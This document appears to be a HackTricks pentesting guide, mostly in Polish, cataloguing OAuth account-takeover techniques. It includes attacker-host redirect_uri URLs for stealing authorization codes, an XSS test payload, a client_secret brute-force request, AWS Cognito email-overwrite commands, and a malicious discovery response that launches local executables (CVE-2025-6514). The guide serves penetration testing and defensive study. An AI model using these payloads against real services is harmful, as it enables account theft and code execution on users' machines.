# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje <a href="#d4a8" id="d4a8"></a>

OAuth oferuje różne wersje, z podstawowymi informacjami dostępnymi na [OAuth 2.0 documentation](https://oauth.net/2/). Niniejsza dyskusja koncentruje się głównie na powszechnie stosowanym [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), dostarczając **ram autoryzacji, które pozwalają aplikacji na dostęp lub wykonywanie działań na koncie użytkownika w innej aplikacji** (authorization server).

Rozważmy hipotetyczną stronę _**https://example.com**_, zaprojektowaną do **wyświetlania wszystkich Twoich postów w social media**, w tym prywatnych. Aby to osiągnąć, stosowany jest OAuth 2.0. _https://example.com_ poprosi Cię o pozwolenie na **dostęp do Twoich postów w social media**. W rezultacie na _https://socialmedia.com_ pojawi się ekran zgody, przedstawiający **żądane uprawnienia oraz dewelopera proszącego o dostęp**. Po wyrażeniu zgody, _https://example.com_ zyskuje możliwość **dostępu do Twoich postów w Twoim imieniu**.

Ważne jest zrozumienie następujących komponentów w ramach OAuth 2.0:

- **resource owner**: Ty, jako **użytkownik/podmiot**, udzielasz dostępu do swojego zasobu, np. postów z konta w social media.
- **resource server**: **serwer obsługujący uwierzytelnione żądania** po tym, jak aplikacja uzyska `access token` w imieniu `resource owner`, np. **https://socialmedia.com**.
- **client application**: **aplikacja żądająca autoryzacji** od `resource owner`, np. **https://example.com**.
- **authorization server**: **serwer wydający `access tokens`** dla `client application` po pomyślnym uwierzytelnieniu `resource owner` i uzyskaniu zgody, np. **https://socialmedia.com**.
- **client_id**: Publiczny, unikalny identyfikator aplikacji.
- **client_secret:** Poufny klucz, znany tylko aplikacji i authorization server, używany do generowania `access_tokens`.
- **response_type**: Wartość określająca **typ żądanego tokena**, np. `code`.
- **scope**: **Poziom dostępu**, o który `client application` prosi `resource owner`.
- **redirect_uri**: **URL, na który użytkownik jest przekierowywany po autoryzacji**. Zazwyczaj musi odpowiadać wcześniej zarejestrowanemu redirect URL.
- **state**: Parametr służący do **utrzymania danych podczas przekierowania użytkownika do i z authorization server**. Jego unikalność jest kluczowa jako mechanizm **ochrony przed CSRF**.
- **grant_type**: Parametr wskazujący **rodzaj grantu i typ zwracanego tokena**.
- **code**: Kod autoryzacji od authorization server, używany wraz z `client_id` i `client_secret` przez client application do pozyskania `access_token`.
- **access_token**: Token, którego client application używa do żądań API w imieniu `resource owner`.
- **refresh_token**: Umożliwia aplikacji **uzyskanie nowego `access_token` bez ponownego proszenia użytkownika o zgodę**.

### Przebieg

Rzeczywisty **OAuth flow** przebiega następująco:

1. Wchodzisz na [https://example.com](https://example.com) i wybierasz przycisk „Integrate with Social Media”.
2. Strona wysyła żądanie do [https://socialmedia.com](https://socialmedia.com) z prośbą o Twoją autoryzację, aby aplikacja https://example.com mogła uzyskać dostęp do Twoich postów. Żądanie jest sformułowane w następujący sposób:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Następnie zostanie Ci przedstawiona strona zgody.
4. Po Twojej akceptacji, Social Media wysyła odpowiedź na `redirect_uri` z parametrami `code` i `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com wykorzystuje ten `code`, wraz z jego `client_id` i `client_secret`, w celu wykonania żądania po stronie serwera i uzyskania `access_token` w Twoim imieniu, umożliwiając dostęp do uprawnień, na które udzieliłeś zgody:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Na koniec proces kończy się, gdy https://example.com wykorzystuje Twój `access_token`, aby wykonać wywołanie API do serwisu społecznościowego w celu uzyskania dostępu

## Luki w zabezpieczeniach <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Zgodnie z [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), serwer autoryzacji musi przekierowywać przeglądarkę tylko do **pre-registered, exact redirect URIs**. Każda słabość tutaj pozwala atakującemu wysłać ofiarę przez złośliwy URL autoryzacyjny tak, że IdP dostarcza `code` (i `state`) prosto do endpointu atakującego, który może go wykupić i zebrać tokeny.

Typowy przebieg ataku:

1. Skomponuj `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` i prześlij go do ofiary.
2. Ofiara się uwierzytelnia i zatwierdza scopes.
3. IdP przekierowuje do `attacker.tld/callback?code=<victim-code>&state=...`, gdzie atakujący loguje żądanie i natychmiast wymienia `code`.

Typowe błędy walidacji do przetestowania:

- **No validation** – akceptowany jest dowolny absolutny URL, co skutkuje natychmiastową kradzieżą `code`.
- **Weak substring/regex checks on the host** – obejście za pomocą podobnych nazw takich jak `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, lub `match.com@evil.com`.
- **IDN homograph mismatches** – walidacja odbywa się na formie punycode (`xn--`), ale przeglądarka przekierowuje do domeny Unicode kontrolowanej przez atakującego.
- **Arbitrary paths on an allowed host** – skierowanie `redirect_uri` na `/openredirect?next=https://attacker.tld` lub dowolny endpoint XSS/treści_użytkownika ujawnia `code` przez łańcuchowe przekierowania, nagłówki Referer lub zainjektowany JavaScript.
- **Directory constraints without normalization** – wzorce takie jak `/oauth/*` można obejść przez `/oauth/../anything`.
- **Wildcard subdomains** – akceptowanie `*.example.com` oznacza, że każde przejęcie subdomeny (dangling DNS, S3 bucket itp.) natychmiast daje ważny callback.
- **Non-HTTPS callbacks** – przepuszczenie URI `http://` daje atakującym w sieci (Wi‑Fi, proxy korporacyjne) możliwość przechwycenia `code` w tranzycie.

Sprawdź również pomocnicze parametry redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri` itp.) oraz OpenID discovery document (`/.well-known/openid-configuration`) pod kątem dodatkowych endpointów, które mogą dziedziczyć te same błędy walidacji.

### XSS w implementacji przekierowania <a href="#bda5" id="bda5"></a>

Jak wspomniano w tym raporcie bug bounty [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), możliwe, że redirect **URL jest odzwierciedlany w odpowiedzi** serwera po uwierzytelnieniu użytkownika, przez co jest **podatny na XSS**. Możliwy payload do przetestowania:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Nieprawidłowe obsługiwanie parametru state <a href="#bda5" id="bda5"></a>

Parametr `state` jest CSRF tokenem w Authorization Code flow: klient musi wygenerować **kryptograficznie losową wartość dla każdej instancji przeglądarki**, przechować ją w miejscu czytelnym tylko dla tej przeglądarki (cookie, local storage itp.), wysłać ją w żądaniu autoryzacyjnym i odrzucić każdą odpowiedź, która nie zwraca tej samej wartości. Gdy wartość jest statyczna, przewidywalna, opcjonalna lub niepowiązana z sesją użytkownika, atakujący może dokończyć własny OAuth flow, przechwycić końcowe żądanie `?code=` (bez jego wysyłania), a później zmusić przeglądarkę ofiary do odtworzenia tego żądania, tak że konto ofiary zostanie powiązane z profilem atakującego u dostawcy tożsamości (IdP).

Wzorzec replay jest zawsze ten sam:

1. Atakujący uwierzytelnia się u IdP swoim kontem i przechwytuje ostatni redirect zawierający `code` (i ewentualnie `state`).
2. Porzuca to żądanie, zachowuje URL i później wykorzystuje dowolny CSRF primitive (link, iframe, auto-submitting form), by zmusić przeglądarkę ofiary do jego załadowania.
3. Jeśli klient nie egzekwuje `state`, aplikacja przyjmuje wynik autoryzacji atakującego i loguje atakującego do konta aplikacji należącego do ofiary.

Praktyczna lista kontrolna dla obsługi `state` podczas testów:

- **Brak `state` w ogóle** – jeśli parametr nigdy się nie pojawia, całe logowanie jest podatne na CSRF.
- **`state` nie jest wymagany** – usuń go z żądania początkowego; jeśli IdP nadal wydaje kody, które klient akceptuje, ochrona jest opt-in.
- **Zwracany `state` nie jest walidowany** – zmodyfikuj wartość w odpowiedzi (Burp, MITM proxy). Akceptowanie niezgodnych wartości oznacza, że przechowywany token nigdy nie jest porównywany.
- **Przewidywalny lub czysto danych-driven `state`** – wiele aplikacji umieszcza ścieżki redirect lub bloby JSON w `state` bez dodania entropii, co pozwala atakującym zgadywać prawidłowe wartości i odtwarzać flow. Zawsze poprzedzaj/dołącz silną entropię przed zakodowaniem danych.
- **Fixation `state`** – jeśli aplikacja pozwala użytkownikom podawać wartość `state` (np. przez spreparowane URL autoryzacji) i ponownie jej używa w całym flow, atakujący może zablokować znaną wartość i ponownie użyć jej wobec ofiar.

PKCE może uzupełniać `state` (szczególnie dla public clients) poprzez związanie authorization code z code verifier, ale web clients nadal muszą śledzić `state`, by zapobiegać błędom CSRF/powiązania kont między użytkownikami.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Brak weryfikacji e-mail podczas tworzenia konta**: Atakujący może uprzednio stworzyć konto używając e-maila ofiary. Jeśli ofiara później zaloguje się przez third-party service, aplikacja może niezamierzenie powiązać to konto third-party z uprzednio utworzonym kontem atakującego, prowadząc do nieautoryzowanego dostępu.
2. **Wykorzystanie luźnej weryfikacji e-mail w OAuth**: Atakujący mogą wykorzystać serwisy OAuth, które nie weryfikują e-maili, rejestrując się i następnie zmieniając e-mail konta na e-mail ofiary. Ta metoda również stwarza ryzyko nieautoryzowanego dostępu, podobnie jak pierwszy scenariusz, ale przez inny wektor ataku.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

`client_id` jest celowo publiczny, ale **`client_secret` nigdy nie powinien być odzyskiwalny przez użytkowników końcowych**. Deploymenty Authorization Code, które umieszczają secret w **mobile APKs, desktop clients, lub single-page apps** praktycznie oddają te poświadczenia każdemu, kto może pobrać pakiet. Zawsze sprawdzaj public clients poprzez:

- Rozpakowanie APK/IPA, instalatora desktopowego lub aplikacji Electron i grepnięcie po `client_secret`, Base64 blobach, które dekodują się do JSON, albo hard-coded OAuth endpoints.
- Przejrzenie dołączonych plików konfiguracyjnych (plist, JSON, XML) lub zdekompilowanych stringów w poszukiwaniu poświadczeń klienta.

Gdy atakujący wydobędzie secret, wystarczy, że wykraść dowolny authorization `code` (przez słabe `redirect_uri`, logi itp.), aby samodzielnie wywołać `/token` i wyemitować access/refresh tokens bez udziału legitnego klienta. Traktuj public/native clients jako **niezdolne do przechowywania sekretów** — powinny zamiast tego polegać na PKCE (RFC 7636), aby udowodnić posiadanie per-instance code verifier zamiast statycznego secret. Podczas testów potwierdź, czy PKCE jest obowiązkowe i czy backend faktycznie odrzuca wymiany tokenów, które pomijają albo `client_secret` **albo** poprawny `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.


### Access Token Stored in Browser History

Główna gwarancja Authorization Code grant polega na tym, że **access tokens nigdy nie trafiają do przeglądarki właściciela zasobu**. Gdy implementacje leakują tokeny po stronie klienta, każda drobna wada (XSS, Referer leak, logowanie na proxy) staje się natychmiastowym przejęciem konta. Zawsze sprawdź:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts. Test for weak binding by:

- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.

Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Po więcej szczegółowych informacji o tym, jak nadużywać AWS Cognito sprawdź [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Nadużywanie other Apps tokens <a href="#bda5" id="bda5"></a>

Jak [**wspomniano w tym artykule**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), przepływy OAuth, które oczekują otrzymania **token** (a nie code) mogą być podatne, jeśli nie sprawdzają, czy token należy do danej aplikacji.

Jest tak, ponieważ **attacker** mógłby stworzyć **application supporting OAuth and login with Facebook** (na przykład) we własnej aplikacji. Gdy **victim** zaloguje się przez Facebook w **attackers application**, attacker mógłby otrzymać **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Dlatego, jeżeli attacker zdoła skłonić usera do użycia jego własnej aplikacji OAuth, będzie w stanie przejąć konto victim w aplikacjach, które oczekują token i nie sprawdzają, czy token został przyznany ich app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Zgodnie z [**tym artykułem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), możliwe było zmuszenie victim do otwarcia strony z parametr `returnUrl` wskazującym na hosta attackera. Ta informacja była **stored in a cookie (RU)** i w **późniejszym kroku** prompt zapyta usera, czy chce udzielić dostępu temu attackers hostowi.

Aby obejść ten prompt, można było otworzyć kartę rozpoczynającą OAuth flow, która ustawiłaby ciasteczko RU używając returnUrl, zamknąć tę kartę zanim prompt zostanie pokazany i otworzyć nową kartę bez tej wartości. Wtedy prompt nie poinformuje o attackers host, ale cookie pozostanie ustawione na niego, więc token zostanie wysłany do attackers host podczas przekierowania.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Jak wyjaśniono w [**tym wideo**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), niektóre implementacje OAuth pozwalają określić GET parametr `prompt` jako None (`&prompt=none`), żeby zapobiec wyświetleniu użytkownikom prompta z potwierdzeniem żądanego dostępu w sieci, jeżeli są już zalogowani na platformie.

### response_mode

Jak [**wyjaśniono w tym wideo**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), może być możliwe wskazanie parametru `response_mode`, aby określić, gdzie ma być dostarczony code w końcowym URL:

- `response_mode=query` -> code jest dostarczany w parametrze GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> code jest dostarczany w fragmencie URL: `#code=2397rf3gu93f`
- `response_mode=form_post` -> code jest dostarczany w formularzu POST jako input o nazwie `code` i wartości
- `response_mode=web_message` -> code jest wysyłany w post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Dialogi zgody/logowania OAuth to idealne cele do clickjackingu: jeśli można je osadzić w ramce, attacker może nałożyć własną grafikę, ukryć prawdziwe przyciski i skłonić użytkowników do zatwierdzenia niebezpiecznych scope’ów lub powiązania kont. Stwórz PoC, które:

1. Ładuje URL autoryzacji IdP wewnątrz `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Używa absolutnego pozycjonowania/trików z opacity, aby wyrównać fałszywe przyciski z ukrytymi kontrolkami **Allow**/**Approve**.
3. Opcjonalnie pre-filluje parametry (scopes, redirect URI), aby skradzione zatwierdzenie natychmiast dawało korzyść attackerowi.

Podczas testów sprawdź, czy strony IdP wysyłają `X-Frame-Options: DENY/SAMEORIGIN` lub restrykcyjne `Content-Security-Policy: frame-ancestors 'none'`. Jeśli żadne z nich nie występuje, zademonstruj ryzyko za pomocą narzędzi takich jak [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) i zarejestruj, jak łatwo victim autoryzuje aplikację attacker’a. Dodatkowe pomysły na payloady znajdziesz w [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Zgodnie z [**tym postem na blogu**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), jest to przepływ OAuth, który pozwala logować się do OAuth używając username i password. Jeśli podczas tego prostego przepływu zwracany jest token z dostępem do wszystkich akcji, które user może wykonać, możliwe jest obejście 2FA używając tego token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Ten [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) opisuje, jak można było nadużyć open redirect używając wartości z referrer, aby zamienić OAuth w ATO. Atak wyglądał tak:

1. Victim wchodzi na stronę attacker’a.
2. Victim otwiera złośliwy link i opener uruchamia Google OAuth flow z dodatkowymi parametrami `response_type=id_token,code&prompt=none` używając attackers website jako referrer.
3. W openerze, po autoryzacji provider odsyła victim z powrotem na wartość parametru `redirect_uri` (strona victim) z kodem 30X, który wciąż zachowuje attackers website w refererze.
4. Strona victim **uruchamia open redirect bazując na referrerze**, przekierowując usera do attackers website — ponieważ `respose_type` było `id_token,code`, code zostanie przesłany do attacker’a w fragmencie URL, pozwalając mu przejąć konto użytkownika przez Google na stronie victim.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Sprawdź to badanie**](https://portswigger.net/research/hidden-oauth-attack-vectors) **dla dalszych szczegółów tej techniki.**

Dynamic Client Registration w OAuth działa jako mniej oczywisty, ale krytyczny wektor dla podatności bezpieczeństwa, szczególnie dla ataków typu Server-Side Request Forgery (SSRF). Ten endpoint pozwala serwerom OAuth otrzymywać szczegóły o aplikacjach klienckich, w tym wrażliwe URL-e, które mogą zostać wykorzystane.

Kluczowe punkty:

- Dynamic Client Registration często jest mapowany na `/register` i akceptuje szczegóły takie jak `client_name`, `client_secret`, `redirect_uris` oraz URL-e do logo lub JSON Web Key Sets (JWKs) za pomocą żądań POST.
- Funkcja ta przestrzega specyfikacji z **RFC7591** i **OpenID Connect Registration 1.0**, które zawierają parametry potencjalnie podatne na SSRF.
- Proces rejestracji może niechcący wystawić serwery na SSRF na kilka sposobów:
  - **`logo_uri`**: URL do logo aplikacji klienckiej, który serwer może pobrać, wywołując SSRF lub prowadząc do XSS, jeśli URL jest źle obsłużony.
  - **`jwks_uri`**: URL do dokumentu JWK klienta, który w złośliwym scenariuszu może spowodować, że serwer wykona żądania do serwera kontrolowanego przez attacker’a.
  - **`sector_identifier_uri`**: Odnosi się do tablicy JSON `redirect_uris`, którą serwer może pobrać, tworząc możliwość SSRF.
  - **`request_uris`**: Lista dozwolonych request URI dla klienta, którą można wykorzystać, jeśli serwer pobiera te URI na początku procesu autoryzacji.

Strategia eksploatacji:

- SSRF można wywołać, rejestrując nowego klienta z złośliwymi URL-ami w parametrach takich jak `logo_uri`, `jwks_uri` lub `sector_identifier_uri`.
- Chociaż bezpośrednia eksploatacja przez `request_uris` może być ograniczona przez mechanizmy whitelist, dostarczenie wstępnie zarejestrowanego, kontrolowanego przez attacker’a `request_uri` może umożliwić SSRF podczas fazy autoryzacji.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Badanie dotyczące [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (wpływające na klientów `mcp-remote` takich jak Claude Desktop, Cursor czy Windsurf) pokazuje, jak dynamiczne discovery OAuth staje się prymitywem RCE, gdy klient przekazuje metadata IdP bezpośrednio do systemu operacyjnego. Zdalny serwer MCP zwraca kontrolowany przez attacker’a `authorization_endpoint` podczas wymiany discovery (`/.well-known/openid-configuration` lub dowolne RPC metadata). `mcp-remote ≤0.1.15` następnie wywoływał systemowy handler URL (`start`, `open`, `xdg-open` itp.) z przekazanym ciągiem, więc każda obsługiwana przez OS schemat/ścieżka była wykonywana lokalnie.

Attack workflow

1. Wskaż desktop agenta na wrogie MCP/OAuth server (`npx mcp-remote https://evil`). Agent otrzymuje `401` plus metadata.
2. Serwer odpowiada JSON-em takim jak:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Klient uruchamia handler systemu operacyjnego dla dostarczonego URI. Windows akceptuje payloady typu `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux akceptują `file:///Applications/Calculator.app/...` lub nawet niestandardowe scheme'y takie jak `cmd://bash -lc '<payload>'` jeśli są zarejestrowane.
4. Ponieważ dzieje się to przed jakąkolwiek interakcją użytkownika, **samodzielne skonfigurowanie klienta, by komunikował się z serwerem atakującego, prowadzi do wykonania kodu**.

**Jak testować**

- Celuj w dowolny desktop/agent kompatybilny z OAuth, który wykonuje discovery przez HTTP(S) i otwiera zwrócone endpoints lokalnie (Electron apps, CLI helpers, thick clients).
- Przechwyć lub hostuj odpowiedź discovery i zastąp `authorization_endpoint`, `device_authorization_endpoint` lub podobne pola przez `file://`, `cmd://`, UNC paths lub inne niebezpieczne schemy.
- Obserwuj, czy klient weryfikuje scheme/host. Brak walidacji skutkuje natychmiastowym wykonaniem w kontekście użytkownika i potwierdza problem.
- Powtórz z różnymi schemami, aby zmapować całą powierzchnię ataku (np. `ms-excel:`, `data:text/html,`, custom protocol handlers) i wykazać zasięg cross-platform.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**przeczytaj to, aby przetestować możliwe Race Conditions**](race-condition.md).

## Mutable Claims Attack

W OAuth pole sub jednoznacznie identyfikuje użytkownika, ale jego format różni się w zależności od Authorization Server. Aby ujednolicić identyfikację użytkownika, niektóre klienty używają adresów email lub user handle. Jednakże jest to ryzykowne, ponieważ:

- Niektóre Authorization Servers nie gwarantują, że te właściwości (jak email) pozostaną niezmienne.
- W niektórych implementacjach — takich jak **"Login with Microsoft"** — klient polega na polu email, które jest **kontrolowane przez użytkownika w Entra ID** i nie jest weryfikowane.
- Atakujący może to wykorzystać, tworząc własną organizację Azure AD (np. doyensectestorg) i używając jej do wykonania Microsoft login.
- Mimo że Object ID (przechowywane w sub) jest niezmienne i bezpieczne, poleganie na mutowalnym polu email może umożliwić account takeover (np. przejęcie konta takiego jak victim@gmail.com).

## Client Confusion Attack

W ramach **Client Confusion Attack** aplikacja używająca OAuth Implicit Flow nie weryfikuje, że finalny access token został wygenerowany konkretnie dla jej własnego Client ID. Atakujący zakłada publiczną stronę wykorzystującą Google’s OAuth Implicit Flow, nakłania tysiące użytkowników do logowania i w ten sposób zbiera access tokeny przeznaczone dla strony atakującego. Jeśli ci użytkownicy mają również konta na innej podatnej stronie, która nie weryfikuje Client ID tokena, atakujący może ponownie użyć zebranych tokenów, by podszyć się pod ofiary i przejąć ich konta.

## Scope Upgrade Attack

Typ **Authorization Code Grant** obejmuje bezpieczną komunikację server-to-server przy transmisji danych użytkownika. Jednak jeśli **Authorization Server** implicitnie ufa parametrowi scope w Access Token Request (parametr nieokreślony w RFC), złośliwa aplikacja może podnieść uprawnienia authorization code, żądając wyższego scope. Po wygenerowaniu **Access Token**, **Resource Server** musi go zweryfikować: dla tokenów JWT oznacza to sprawdzenie JWT signature i wydobycie danych takich jak client_id i scope, podczas gdy dla losowych stringów tokenów serwer musi zapytać Authorization Server o szczegóły tokena.

## Redirect Scheme Hijacking

W mobilnych implementacjach OAuth aplikacje używają **custom URI schemes**, aby otrzymywać redirecty z Authorization Codes. Jednak ponieważ wiele aplikacji może zarejestrować ten sam scheme na urządzeniu, założenie, że tylko legitny klient kontroluje redirect URI, jest naruszone. Na Androidzie, na przykład, Intent URI takie jak `com.example.app://` oauth jest łapane na podstawie scheme i opcjonalnych filtrów zdefiniowanych w intent-filter aplikacji. Ponieważ rozstrzyganie intentów w Android może być szerokie — szczególnie jeśli określony jest tylko scheme — atakujący może zarejestrować złośliwą aplikację z odpowiednio skonstruowanym intent filter, aby przechwycić authorization code. Może to **umożliwić account takeover** zarówno przez interakcję z użytkownikiem (gdy wiele aplikacji kwalifikuje się do obsługi intentu), jak i poprzez techniki bypassu wykorzystujące zbyt specyficzne filtry, jak opisane w flowcharcie oceny Ostorlab.

## Referencje

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
